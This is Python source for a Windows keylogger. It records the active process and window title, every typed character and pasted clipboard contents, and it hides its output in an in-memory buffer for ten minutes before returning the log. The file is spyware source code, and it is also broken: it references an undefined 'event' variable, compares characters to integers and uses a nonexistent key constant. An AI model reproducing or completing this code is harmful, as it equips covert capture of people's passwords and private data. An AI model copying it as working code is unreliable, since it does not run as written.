from ctypes import byref, create_string_buffer, c_ulong, windll
from io import StringIO
from pynput import keyboard

import os
import sys
import time
import win32clipboard

TIMEOUT = 60*10

class keyLogger:
    def __init__(self):
        self.current_window = None
        
    def get_current_window(self):
        hwnd = windll.user32.GetForegroundWindow()
        pid = c_ulong(0)
        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
        process_id = f'{pid.value}'
    
        executable = create_string_buffer(512)
        h_process = windll.kernel32.OpenProcess(0x400 | 0x10, False, pid) #// (process information, herit, process ID)
        windll.psapi.GetModuleBaseNameA(h_process, None, byref(executable),512)# // (Process, module, save buffer, buffer size)
        
        window_title = create_string_buffer(512)
        windll.user32.GetWindowTextA(hwnd, byref(window_title), 512)
        try:
            self.current_window = window_title.value.decode()
        except UnicodeDecodeError as e:
            print(f'{e} : window name unknown')
        
        print('\n', process_id, executable.value.decode(), self.current_window)
        
        windll.kernel32.CloseHandle(h_process)
        
    def mykeystroke(self, key):
        if event.Windowname != self.current_window:
            self.get_current_window()
        try: 
            if 32 < key.char < 127:
                print(key.char, end='',flush=True)
        except AttributeError:
            if key == keyboard.Key.v:
                win32clipboard.OpenClipboard()
                value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                print(f'[PASTE] - {value}',flush=True)
            else:
                print(f'{event.key}', flush=True)
        return True
    
def run():
    import time
    save_stdout = sys.stdout
    sys.stdout = StringIO()
    start = time.time()
    kl = keyLogger()
    listner = keyboard.Listener(on_press=kl.mykeystroke)
    listner.start()
    while time.time() - start < TIMEOUT:
        pass
        
    log = sys.stdout.getvalue()
    sys.stdout = save_stdout
    return log
        
    